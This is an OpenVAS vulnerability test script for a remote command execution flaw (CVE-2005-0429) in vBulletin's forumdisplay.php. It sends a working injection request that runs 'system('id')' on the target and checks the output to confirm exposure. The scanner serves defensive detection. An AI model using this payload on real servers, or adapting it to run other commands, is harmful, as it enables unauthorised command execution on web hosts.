# OpenVAS Vulnerability Test
# $Id: vbulletin_forumdisplay_remote_cmd_exec.nasl 3359 2016-05-19 13:40:42Z antu123 $
# Description: vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Ref: AL3NDALEEB <al3ndaleeb at uk2 dot net>

if(description)
{
 script_id(16455);
 script_version("$Revision: 3359 $");
 script_tag(name:"last_modification", value:"$Date: 2016-05-19 15:40:42 +0200 (Thu, 19 May 2016) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2005-0429");
 script_bugtraq_id(12542);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_name("vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability");

 script_summary("Checks for vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability");
 
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 script_family("Web application abuses");
 script_dependencies("http_version.nasl", "vbulletin_detect.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("vBulletin/installed");
 script_tag(name:"solution", value:"Upgrade vBulletin 3.0.4 or newer");
 script_tag(name:"summary", value:"The remote host is running vBulletin, a web based bulletin board system 
written in PHP.

The remote version of this software is vulnerable to remote command 
execution flaw through the script 'forumdisplay.php'.

A malicious user could exploit this flaw to  execute arbitrary command on 
the remote host with the privileges of the web server.");
 exit(0);
}

# the code

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/vBulletin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  http_check_remote_code (
			unique_dir:dir,
			check_request: '/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system(\'id\')."',
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
}
